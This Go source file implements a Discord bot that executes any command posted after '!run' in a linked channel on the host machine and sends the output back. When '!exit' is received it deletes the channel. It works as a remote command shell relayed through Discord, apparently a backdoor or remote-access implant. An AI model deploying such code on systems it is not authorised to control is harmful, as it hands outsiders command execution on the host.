package main

import (
	"fmt"
	"github.com/bwmarrin/discordgo"
	"os"
	"os/exec"
	"strings"
)

// Flags
type Heart struct {
	botSession      *discordgo.Session
	linkedChannel   string
	linkedChannelID string
}

func newHeart(botToken string) *Heart {
	tmp := new(Heart)
	tmp.botSession, _ = discordgo.New("Bot " + botToken)
	return tmp
}

// gets channel id from 'Heart.linkedChannel' and returns it. (should be name of channel)
func (heart Heart) getChannelID(channels Channels) string {
	channelList, _ := heart.botSession.GuildChannels(channels.guildID)

	for _, channel := range channelList {
		if strings.Contains(channel.Name, heart.linkedChannel) {
			temp := channel.ID
			return temp
		}
	}
	return ""
}

func (heart Heart) sendMessage(message string) {
	_, err := heart.botSession.ChannelMessageSend(heart.linkedChannelID, message)
	if err != nil {
		fmt.Println(err)
		return
	}
}

func (heart Heart) endSession() {
	heart.botSession.ChannelDelete(heart.linkedChannelID)
}

// handler functions
func ready(s *discordgo.Session, event *discordgo.Ready) {
	// Set the playing status.
	s.UpdateGameStatus(0, "!run")
}

func (heart Heart) messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
	// Ignore all messages created by the bot itself
	// This isn't required in this specific example but it's a good practice.
	if m.Author.ID == s.State.User.ID {
		return
	}

	// get messages from specific channel, and reply in said channel.
	if m.ChannelID == heart.linkedChannelID {
		if strings.HasPrefix(m.Content, "!run ") {
			s.ChannelMessageSend(m.ChannelID, "`running command...`")

			commandString, _ := strings.CutPrefix(m.Content, "!run ")

			out, err := exec.Command(commandString).Output()

			if err != nil {
				s.ChannelMessageSend(m.ChannelID, "`error has occurred`")
				// s.ChannelMessageSend(m.ChannelID, "`"+ string(err) +"`") find a way maybe?
				fmt.Println(err)
				return
			}
			s.ChannelMessageSend(m.ChannelID, "`Success!`")
			if string(out) != "" {
				s.ChannelMessageSend(m.ChannelID, "```"+string(out)+"```")
			}

		} else if strings.HasPrefix(m.Content, "!exit") {
			s.ChannelMessageSend(m.ChannelID, "`Quitting session...`")

			heart.endSession()
			os.Exit(0)
		}
	}
}
